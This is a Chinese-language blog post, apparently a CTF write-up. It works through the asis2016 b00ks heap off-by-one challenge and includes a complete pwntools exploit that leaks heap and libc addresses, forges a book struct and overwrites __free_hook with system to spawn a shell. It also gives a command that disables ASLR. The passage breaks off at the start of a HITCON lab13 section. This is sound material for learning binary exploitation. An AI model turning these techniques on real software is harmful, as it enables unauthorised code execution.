@@ -1,0 +1,708 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <meta name="description" content="SX1ang&#39;s blog">
+  <meta name="keyword" content="">
+  
+    <link rel="shortcut icon" href="/css/images/logo.png">
+  
+  <title>
+    
+      ctf-wiki-堆利用 | SX1ang
+    
+  </title>
+  <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/tomorrow.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/geopattern/1.2.3/js/geopattern.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.js"></script>
+  
+  
+  
+  
+    <!-- MathJax support START -->
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <!-- MathJax support END -->
+  
+
+
+  
+  
+    
+<script src="/js/local-search.js"></script>
+
+
+<meta name="generator" content="Hexo 5.3.0"></head>
+<div class="wechat-share">
+  <img src="/css/images/logo.png" />
+</div>
+  <body>
+    <header class="header fixed-header">
+  <div class="header-container">
+    <a class="home-link" href="/">
+      <div class="logo"></div>
+      <span>SX1ang</span>
+    </a>
+    <ul class="right-list">
+      
+        <li class="list-item">
+          
+            <a href="/" class="item-link">Home</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/tags/" class="item-link">Tags</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/archives/" class="item-link">Archives</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/about/" class="item-link">About</a>
+          
+        </li>
+      
+      
+        <li class="menu-item menu-item-search right-list">
+    <a role="button" class="popup-trigger">
+        <i class="fa fa-search fa-fw"></i>
+    </a>
+</li>
+      
+    </ul>
+    <div class="menu">
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+    </div>
+    <div class="menu-mask">
+      <ul class="menu-list">
+        
+          <li class="menu-item">
+            
+              <a href="/" class="menu-link">Home</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/tags/" class="menu-link">Tags</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/archives/" class="menu-link">Archives</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/about/" class="menu-link">About</a>
+            
+          </li>
+        
+      </ul>
+    </div>
+    
+      <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+            <span class="search-icon">
+                <i class="fa fa-search"></i>
+            </span>
+            <div class="search-input-container">
+                <input autocomplete="off" autocapitalize="off"
+                    placeholder="Please enter your keyword(s) to search." spellcheck="false"
+                    type="search" class="search-input">
+            </div>
+            <span class="popup-btn-close">
+                <i class="fa fa-times-circle"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+    
+  </div>
+</header>
+
+    <div id="article-banner">
+  <h2>ctf-wiki-堆利用</h2>
+  <p class="post-date">2021-08-19</p>
+  <div class="arrow-down">
+    <a href="javascript:;"></a>
+  </div>
+</div>
+<main class="app-body flex-box">
+  <!-- Article START -->
+  <article class="post-article">
+    <section class="markdown-content"><blockquote>
+<p>  参考：<a target="_blank" rel="noopener" href="https://ciphersaw.me/ctf-wiki/pwn/linux/heap/introduction/">https://ciphersaw.me/ctf-wiki/pwn/linux/heap/introduction/</a></p>
+<p>  本篇文章主要是复现ctf-wiki-堆利用的例题。</p>
+</blockquote>
+<p> <img src="/2021/08/19/ctf-wiki-%E5%A0%86%E5%88%A9%E7%94%A8/program_virtual_address_memory_space.png"> </p>
+<h2 id="堆中的-Off-By-One"><a href="#堆中的-Off-By-One" class="headerlink" title="堆中的 Off-By-One"></a>堆中的 Off-By-One</h2><h3 id="asis2016-b00ks"><a href="#asis2016-b00ks" class="headerlink" title="asis2016_b00ks"></a><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#asis2016_b00ks">asis2016_b00ks</a></h3><p><strong>查看程序基本信息：</strong></p>
+<p><img src="/2021/08/19/ctf-wiki-%E5%A0%86%E5%88%A9%E7%94%A8/image-20210820220109603.png"></p>
+<p>x86_64，little-endian。因为已经知道题目的考点是off-by-one，所以就直接分析。</p>
+<p><strong>程序基本功能：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">webysx@webysx-virtual-machine:~&#x2F;CTF&#x2F;ctf-wiki$ .&#x2F;b00ks </span><br><span class="line">Welcome to ASISCTF book library</span><br><span class="line">Enter author name: aaaaaa</span><br><span class="line"></span><br><span class="line">1. Create a book</span><br><span class="line">2. Delete a book</span><br><span class="line">3. Edit a book</span><br><span class="line">4. Print book detail</span><br><span class="line">5. Change current author name</span><br><span class="line">6. Exit</span><br></pre></td></tr></table></figure>
+<p>可以创建book、删除book、编辑book、打印book详细信息、修改author name。</p>
+<p>程序首先会要用户输入author name，author name的大小限制为32byte。author name是一个全局指针，指向存放author name的空间，大小就是32bytes。</p>
+<img src="/2021/08/19/ctf-wiki-%E5%A0%86%E5%88%A9%E7%94%A8/image-20210820223504038.png" style="zoom:200%;">
+
+<p><img src="/2021/08/19/ctf-wiki-%E5%A0%86%E5%88%A9%E7%94%A8/image-20210820224809412.png"></p>
+<p><img src="/2021/08/19/ctf-wiki-%E5%A0%86%E5%88%A9%E7%94%A8/image-20210820224848423.png"></p>
+<p>在处理用户输入的author name的self_read（sub_9F5）函数中，存在off-by-one漏洞：</p>
+<img src="/2021/08/19/ctf-wiki-%E5%A0%86%E5%88%A9%E7%94%A8/image-20210820221503778.png" style="zoom:200%;">
+
+<p>这里的10是换行符’\n’的ascii。self_read函数首先会读取第一个字符，判断是否为NULL，如果不为NULL，就读取内容。self_read函数会读取字符串结尾的’\n’，并将其转换成\x00，这个\x00就是溢出的one byte。虽然程序限制了author name最大为32 bytes，但是字符串最后的\x00总是被读取的，所以最多会读入33 bytes。这就导致最后的\x00会覆盖author name空间的下一个byte的空间。</p>
+<p><strong>Create：</strong></p>
+<p><img src="/2021/08/19/ctf-wiki-%E5%A0%86%E5%88%A9%E7%94%A8/image-20210820221119394.png"></p>
+<p>Create模块接收用户输入的book name和book description，然后保存到book结构体中。在处理用户输入的name和description的时候，也用到了存在漏洞的self_read函数。</p>
+<p>Create模块还需要关注的一个地方就是每一个book的内容是存放到一个结构体中的。</p>
+<img src="/2021/08/19/ctf-wiki-%E5%A0%86%E5%88%A9%E7%94%A8/image-20210820222802093.png" style="zoom:200%;">
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">struct book&#123;</span><br><span class="line">	int book_id;</span><br><span class="line">	char *book_name_ptr;</span><br><span class="line">	char *book_description_ptr;</span><br><span class="line">	int book_size;</span><br><span class="line">&#125; &#x2F;&#x2F; size of struct &#x3D; 0x20</span><br></pre></td></tr></table></figure>
+<p>还有一个off_202010+v2其实是存放的book struct的首地址的全局变量（数组）。通过仔细观察可以发现off_202010这个全局变量正好是在author name这个全局变量的相邻低地址处，它们俩指向的地址空间也是相邻的。所以可以通过author name的off-by-one漏洞覆盖第一个book的地址的低字节为\x00。book_ptr+6是因为dword，这里是ida识别的问题，转换成qword就是book_ptr+3了。</p>
+<p><img src="/2021/08/19/ctf-wiki-%E5%A0%86%E5%88%A9%E7%94%A8/image-20210820225407691.png"></p>
+<p>这里就出现漏洞的第一个利用点——泄露book的地址。author name最后的\x00会覆盖book指针的低地址（低地址是因为小端存储），但是当Create第一个book时，book的地址又会将\x00覆盖掉，由于没有\x00，打印author name的时候就可以泄露book的地址。</p>
+<p>调试查看，输入author name，然后Create一个book：</p>
+<p>因为程序去除了符号表，下断点参考：<a target="_blank" rel="noopener" href="http://blog.binpang.me/2018/01/22/gdb%E6%97%A0%E6%B3%95%E5%AE%9A%E4%BD%8Dmain/">http://blog.binpang.me/2018/01/22/gdb%E6%97%A0%E6%B3%95%E5%AE%9A%E4%BD%8Dmain/</a></p>
+<p><img src="/2021/08/19/ctf-wiki-%E5%A0%86%E5%88%A9%E7%94%A8/image-20210820231739606.png"></p>
+<p>可以看到book chunk的地址0x555555756040是紧邻在author name的后面的。可以泄露book chunk的地址：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./b00ks&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./b00ks&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Create</span>(<span class="params">book_name_size, book_name, book_description_size, book_description</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">&quot;6. Exit\n&gt; &quot;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Enter book name size: &quot;</span>, <span class="built_in">str</span>(book_name_size))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Enter book name (Max 32 chars): &quot;</span>, book_name)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Enter book description size: &quot;</span>, <span class="built_in">str</span>(book_description_size))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Enter book description: &quot;</span>, book_description)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Print</span>():</span></span><br><span class="line">    io.sendlineafter(<span class="string">&quot;6. Exit\n&gt; &quot;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;Enter author name: &quot;</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">32</span>)</span><br><span class="line">Create(<span class="number">0x20</span>, <span class="string">&#x27;b&#x27;</span>*<span class="number">0x20</span>, <span class="number">0x20</span>, <span class="string">&#x27;c&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">Print()</span><br><span class="line">io.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">32</span>)</span><br><span class="line">book_addr = io.recvn(<span class="number">6</span>)</span><br><span class="line">book_addr = book_addr.ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">book_addr = u64(book_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(book_addr)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<img src="/2021/08/19/ctf-wiki-%E5%A0%86%E5%88%A9%E7%94%A8/image-20210820235452339.png" style="zoom:200%;">
+
+<p>泄露是一种利用方法，后面会用到。</p>
+<p>这个题的突破点就是Change current author name模块，可以再覆盖第一个book chunk地址的低字节为\x00。流程是在Create book1 chunk之后Change author name，然后利用off-by-one漏洞就可以覆盖book1 chunk的地址。</p>
+<p><img src="/2021/08/19/ctf-wiki-%E5%A0%86%E5%88%A9%E7%94%A8/image-20210821000808864.png"></p>
+<p>book1 chunk的地址的低1byte覆盖成00。</p>
+<p>继续分析程序；</p>
+<p><img src="/2021/08/19/ctf-wiki-%E5%A0%86%E5%88%A9%E7%94%A8/image-20210821001445207.png"></p>
+<p>edit_book函数可以修改description的内容，程序根据book结构体的book_description_ptr找到要修改的description的地址空间，并向里面写入修改后的description。如果能够控制book_description_ptr的内容，就可以利用edit_book函数实现任意地址写。同样的道理，print_book函数打印book的description的内容时，也是根据book结构体中的book_description_ptr来找description的，所以控制了book_description_ptr，就可以实现任意地址读。总之，控制book_description_ptr，可以实现任意地址读写。</p>
+<p>现在不能直接控制book_description_ptr的值，只是可以修改book1 chunk的地址为0xXXXXXXXX00。这里可以间接控制book_description_ptr的值，具体步骤是先伪造一个fake book，然后覆盖book1的指针使其指向fake book。当然，fake book的起始地址需要满足和book1的地址的最低一个字节覆盖为\x00之后的值相等。可能会想，将book1的地址覆盖成\x00结尾不是将地址变小了吗，为什么还能指向fake book，这里程序设计的比较好的地方是程序先申请book_name chunk，然后再申请book_description chunk，最后再申请book struct chunk，所以book chunk在高地址，地址减小之后可以落在book_name chunk或者book_description chunk中。所以自然就会想到将fake book放在book_name chunk或者book_description chunk中。虽然程序开启了地址随机化，但是只有地址的高位会变化，低3位一般不会变。</p>
+<p>所以通过前面的分析，这个题目的主要的利用过程是：</p>
+<ol>
+<li> 首先准备两个book，book1来实现任意地址读写，book2来实现泄露libc基地址。</li>
+<li> 在book1的description中伪造一个fake_book1_struct，通过off-by-one漏洞覆盖book数组中book1_struct首地址的低字节，使原先的book1_struct变成伪造fake_book1_struct。在fake_book1_struct中通过构造book_description_ptr的值，然后调用edit和print函数实现任意地址读写，前提是malloc的book_description要足够大，才能让book1_struct指针修改后落在里面。</li>
+<li> Create book2的时候，malloc book_name和book_description的时候大小要非常大（如0x21000），malloc函数才会调用mmap来开辟堆空间，mmap的堆内存都存在于mmap段中，libc也在mmap段中，所以得到book2中book_name_ptr和book_description_ptr，就可以通过偏移得到libc基址。</li>
+<li> 结合2,3两点，在伪造fake_book1_struct，可以让book_description_ptr指向book2的book_name_ptr，然后就可以通过edit book1修改book2的内容。因为调用edit函数的时候，修改的是book中book_description_ptr所指向的内容。</li>
+</ol>
+<p>Create book2主要是为了后面利用的过程比较方便。</p>
+<blockquote>
+<p>  为了方便调试，可以临时禁用系统的地址随机化功能：<code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code>。注意要切换到root用户执行命令，sudo会报错。</p>
+</blockquote>
+<p><img src="/2021/08/19/ctf-wiki-%E5%A0%86%E5%88%A9%E7%94%A8/image-20210906091315765.png"></p>
+<p>首先Create book1和book2，然后打印，泄露出book1_struct和book2_struct的地址。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">io.sendlineafter(&quot;Enter author name: &quot;, &#39;a&#39;*32)</span><br><span class="line">Create_book(0x100, &#39;b&#39;*0x100, 0x100, &#39;b&#39;*0x100) # book1</span><br><span class="line">Create_book(0x21000, &#39;b&#39;*0x20, 0x21000, &#39;c&#39;*0x20) # book2</span><br><span class="line">Print_book_detail()</span><br><span class="line"></span><br><span class="line">io.recvuntil(&#39;a&#39;*32)</span><br><span class="line">tmp &#x3D; io.recvuntil(&#39;\x0a&#39;)</span><br><span class="line">book1_addr &#x3D; u64(tmp[:-1].ljust(8, &#39;\x00&#39;))</span><br><span class="line">book2_addr &#x3D; book1_addr + 0x30</span><br><span class="line">print hex(book1_addr)</span><br><span class="line">print hex(book2_addr)</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/08/19/ctf-wiki-%E5%A0%86%E5%88%A9%E7%94%A8/image-20210906161133318.png"></p>
+<p>构造fake_book1_struct，book1_struct的地址0x555555758490，book1的description的地址是0x555555758380，当覆盖book1_struct的地址为0x555555758400，就会落在description中，伪造的fake_book1_struct的起始地址就是0x555555758400。fake_book1_struct的具体内容是id=1，book_name_ptr赋一个合法地址就可以，book_description_ptr=book2_name_ptr，book_size赋一个合法的大小就可以。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; &#39;a&#39; * 0x80 + p64(1) + p64(book2_addr) * 2 + p64(0xffff)</span><br><span class="line">Edit_book(1, payload)</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/08/19/ctf-wiki-%E5%A0%86%E5%88%A9%E7%94%A8/image-20210906163845746.png"></p>
+<p>修改author_name，覆盖book1_struct的地址。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Change_author_name(&#39;a&#39;*32)</span><br></pre></td></tr></table></figure>
+<p>泄露libc地址。因为book2的description在mmap段中，和libc基址的偏移不变，vmmap查看libc基地址，并泄露book2_description_ptr，可以得到libc基址和description的地址的偏移，利用偏移和泄露的book2_description_ptr就可以得到远程libc基址。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Print_book_detail()</span><br><span class="line">io.recvuntil(&quot;Description: &quot;)</span><br><span class="line">tmp &#x3D; io.recvuntil(&#39;\n&#39;)</span><br><span class="line">book2_name_ptr &#x3D; u64(tmp[:-1].ljust(8, &#39;\x00&#39;))</span><br><span class="line">print hex(book2_name_ptr)</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/08/19/ctf-wiki-%E5%A0%86%E5%88%A9%E7%94%A8/image-20210906175038548.png"></p>
+<p>偏移：0x7ffff7fbd010-0x7ffff79e2000=0x5db010。</p>
+<p>getshell。由于程序启用了<code>FULL RELRO</code>保护措施，无法对<code>GOT</code>进行改写，但是可以改写<code>__free_hook</code>或<code>__malloc_hook</code>。 通过前面计算的libc基址，可以得到__free_hook和system的地址，以及libc中”/bin/sh”字符串的地址。将__free_hook指向的内容修改为system的地址，接下来调用free的时候，__free_hook的值不为null，就会执行__free_hook指向的内容（system）。system函数的参数就是要free的chunk中的内容。</p>
+<img src="/2021/08/19/ctf-wiki-%E5%A0%86%E5%88%A9%E7%94%A8/image-20210906181716111.png" style="zoom:200%;">
+
+<p>与free相关的是delete函数：</p>
+<p><img src="/2021/08/19/ctf-wiki-%E5%A0%86%E5%88%A9%E7%94%A8/image-20210906233113385.png"></p>
+<p>可以看到首先free的是book_name，然后是book_description，最后才是book_struct。在free book_name的时候会触发__free_hook，这时book_name chunk的内容就是system的地址，所以要修改book_name chunk的内容为”/bin/sh”。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">free_hook &#x3D; libc.symbols[&#39;__free_hook&#39;] + libc_base</span><br><span class="line">system &#x3D; libc.symbols[&#39;system&#39;] + libc_base</span><br><span class="line">sh &#x3D; libc.search(&quot;&#x2F;bin&#x2F;sh&quot;).next() + libc_base</span><br><span class="line">payload &#x3D; p64(sh) + p64(free_hook) # book1_description_ptr points to book2_name_ptr</span><br><span class="line">Edit_book(1, payload)</span><br><span class="line">Edit_book(2, p64(system))</span><br><span class="line"></span><br><span class="line">Delete_book(2)</span><br></pre></td></tr></table></figure>
+<p>因为book1_description_ptr是指向的book2_name_ptr的，所以修改book1就是修改book2_name_ptr和book2_description_ptr的值，将book2_name_ptr修改为”/bin/sh”的地址，book2_description_ptr修改为__free_hook的地址，这样在修改book2的时候修改的是book2_description_ptr所指向的值，也就是__free_hook的值，将其修改为system之后，在free book2时，会执行system，并将book2_name的内容，也就是”/bin/sh”作为system的参数，最后getshell。</p>
+<p><strong>完整exp：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">#io &#x3D; process([&#39;gdbserver&#39;, &#39;:1234&#39;, &#39;.&#x2F;b00ks&#39;])</span><br><span class="line">io &#x3D; process(&#39;.&#x2F;b00ks&#39;)</span><br><span class="line">elf &#x3D; ELF(&quot;.&#x2F;b00ks&quot;)</span><br><span class="line">libc &#x3D; ELF(&quot;.&#x2F;libc-2.27.so&quot;)</span><br><span class="line"></span><br><span class="line">def Create_book(book_name_size, book_name, book_description_size, book_description):</span><br><span class="line">    io.sendlineafter(&quot;6. Exit\n&gt; &quot;, str(1))</span><br><span class="line">    io.sendlineafter(&quot;Enter book name size: &quot;, str(book_name_size))</span><br><span class="line">    io.sendlineafter(&quot;Enter book name (Max 32 chars): &quot;, book_name)</span><br><span class="line">    io.sendlineafter(&quot;Enter book description size: &quot;, str(book_description_size))</span><br><span class="line">    io.sendlineafter(&quot;Enter book description: &quot;, book_description)</span><br><span class="line"></span><br><span class="line">def Print_book_detail():</span><br><span class="line">    io.sendlineafter(&quot;6. Exit\n&gt; &quot;, str(4))</span><br><span class="line"></span><br><span class="line">def Change_author_name(name):</span><br><span class="line">    io.sendlineafter(&quot;6. Exit\n&gt; &quot;, str(5))</span><br><span class="line">    io.sendlineafter(&quot;Enter author name: &quot;, name)</span><br><span class="line"></span><br><span class="line">def Edit_book(book_id, new_description):</span><br><span class="line">    io.sendlineafter(&quot;6. Exit\n&gt; &quot;, str(3))</span><br><span class="line">    io.sendlineafter(&quot;Enter the book id you want to edit: &quot;, str(book_id))</span><br><span class="line">    io.sendlineafter(&quot;Enter new book description: &quot;, new_description)</span><br><span class="line"></span><br><span class="line">def Delete_book(book_id):</span><br><span class="line">    io.sendlineafter(&quot;6. Exit\n&gt; &quot;, str(2))</span><br><span class="line">    io.sendlineafter(&quot;Enter the book id you want to delete: &quot;, str(book_id))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Create book1, book2</span><br><span class="line">io.sendlineafter(&quot;Enter author name: &quot;, &#39;a&#39;*32)</span><br><span class="line">Create_book(0x100, &#39;b&#39;*0x100, 0x100, &#39;b&#39;*0x100) # book1</span><br><span class="line">Create_book(0x21000, &#39;b&#39;*0x20, 0x21000, &#39;c&#39;*0x20 ) # book2</span><br><span class="line"></span><br><span class="line">#leak book1_address, book2_address</span><br><span class="line">Print_book_detail()</span><br><span class="line">io.recvuntil(&#39;a&#39;*32)</span><br><span class="line">tmp &#x3D; io.recvuntil(&#39;\n&#39;)</span><br><span class="line">book1_addr &#x3D; u64(tmp[:-1].ljust(8, &#39;\x00&#39;))</span><br><span class="line">book2_addr &#x3D; book1_addr + 0x30</span><br><span class="line">print hex(book1_addr)</span><br><span class="line">print hex(book2_addr)</span><br><span class="line"></span><br><span class="line">#fake book1</span><br><span class="line">payload &#x3D; &#39;a&#39; * 0x80 + p64(1) + p64(book2_addr + 8) * 2 + p64(0xffff)</span><br><span class="line">Edit_book(1, payload)</span><br><span class="line"></span><br><span class="line">#cover book1_address</span><br><span class="line">Change_author_name(&#39;a&#39;*32)</span><br><span class="line"></span><br><span class="line">#leak book2_name_ptr &amp; libc_base_address</span><br><span class="line">Print_book_detail()</span><br><span class="line">io.recvuntil(&quot;Description: &quot;)</span><br><span class="line">tmp &#x3D; io.recvuntil(&#39;\n&#39;)</span><br><span class="line">book2_name_ptr &#x3D; u64(tmp[:-1].ljust(8, &#39;\x00&#39;))</span><br><span class="line">print hex(book2_name_ptr)</span><br><span class="line">libc_base &#x3D; book2_name_ptr - 0x5db010</span><br><span class="line">print &quot;Libc_base: &quot; + hex(libc_base)</span><br><span class="line"></span><br><span class="line"># get_shell</span><br><span class="line">free_hook &#x3D; libc.symbols[&#39;__free_hook&#39;] + libc_base</span><br><span class="line">system &#x3D; libc.symbols[&#39;system&#39;] + libc_base</span><br><span class="line">sh &#x3D; libc.search(&quot;&#x2F;bin&#x2F;sh&quot;).next() + libc_base</span><br><span class="line">payload &#x3D; p64(sh) + p64(free_hook) # book1_description_ptr points to book2_name_ptr</span><br><span class="line">Edit_book(1, payload)</span><br><span class="line">Edit_book(2, p64(system))</span><br><span class="line"></span><br><span class="line">Delete_book(2)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<p><strong>总结：</strong></p>
+<ol>
+<li> 泄露libc：可以申请一块很大的chunk，这样就会分配到mmap段的chunk，libc也在mmap段中，通过在本地计算chunk中指针与libc基址的偏移，就可以泄露远程libc的基址，前提是需要泄露chunk中的地址；</li>
+<li> __free_hook getshell。</li>
+</ol>
+<p>参考文章：</p>
+<p><a target="_blank" rel="noopener" href="https://ciphersaw.me/ctf-wiki/pwn/linux/heap/off_by_one/">https://ciphersaw.me/ctf-wiki/pwn/linux/heap/off_by_one/</a></p>
+<p><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-225611.htm">https://bbs.pediy.com/thread-225611.htm</a></p>
+<p><a target="_blank" rel="noopener" href="https://cq674350529.github.io/2018/06/05/asis-ctf-2016-pwn-b00ks/">https://cq674350529.github.io/2018/06/05/asis-ctf-2016-pwn-b00ks/</a></p>
+<p><a target="_blank" rel="noopener" href="https://lantern.cool/note-pwn-free-hook/">https://lantern.cool/note-pwn-free-hook/</a></p>
+<p><a target="_blank" rel="noopener" href="https://seanachao.github.io/2020/07/13/hook%E5%8A%AB%E6%8C%81/">https://seanachao.github.io/2020/07/13/hook%E5%8A%AB%E6%8C%81/</a></p>
+<h2 id="Chunk-Extend-and-Overlapping"><a href="#Chunk-Extend-and-Overlapping" class="headerlink" title="Chunk Extend and Overlapping"></a>Chunk Extend and Overlapping</h2><h3 id="HITCON-Trainging-lab13"><a href="#HITCON-Trainging-lab13" class="headerlink" title="HITCON Trainging lab13"></a><a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/chunk-extend-shrink/hitcontraning_lab13">HITCON Trainging lab13</a></h3><p><strong>保护：</strong></p>
+<p><img src="/2021/08/19/ctf-wiki-%E5%A0%86%E5%88%A9%E7%94%A8/image-20220224172651235.png"></p>
+<p>只开启了Canary和NX保护。</p>
+<p><strong>架构：x86_64</strong></p>
+<p>程序实现的是一个堆管理器：</p>
+<p><img src="/2021/08/19/ctf-wiki-%E5%A0%86%E5%88%A9%E7%94%A8/image-20220224193315543.png"></p>
+<p><strong>主要功能</strong>：</p>
+<ol>
+<li><p>Create a Heap：</p>
